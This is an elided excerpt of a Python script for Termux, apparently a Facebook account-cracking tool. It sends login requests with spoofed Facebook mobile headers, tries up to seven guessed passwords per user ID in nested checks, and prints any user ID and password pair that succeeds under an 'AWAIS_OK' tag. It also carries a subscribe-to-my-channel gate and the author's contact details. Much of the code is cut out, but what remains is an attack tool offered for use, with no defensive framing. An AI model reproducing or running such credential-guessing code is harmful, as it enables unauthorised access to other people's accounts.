...
if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    ...
    print("\033[1;32mPlease subscribe my chanel To Continue\033[0;97m")

    os.system("xdg-open https://youtu.be/P7sds1fOyrM")
    ...
    print("\033[1;32mPlease subscribe my YouTube Chanel To Continue\033[0;97m")
...
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 9; TECNO KC8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
...
def logo():
    ...
    os.system('echo -e "\n\n🇦 🇼 🇦 🇮 🇸 \n\n-----------------------------------------------\n\n➄1�7 Codded By : AWAIS_MOMAND\n➄1�7 Facebook  : AWAIS KHAN\n➄1�7 Whatsapp   : +923173725015\n➄1�7 Youtube   : TECHNICAL AWAIA\n\n-----------------------------------------------" | lolcat')
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;92m[AWAIS_OK] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				...
				print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error"]:
					...
					if "loc" in q:
						...
						print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error"]:
							...
							if "loc" in q:
								...
								print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error"]:
									...
									if "loc" in q:
										...
										print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error"]:
											...
											if "loc" in q:
												...
												print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error"]:
													...
													if "loc" in q:
														...
														print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error"]:
															...
															if "loc" in q:
																...
																print("\033[1;32m[AWAIS_OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
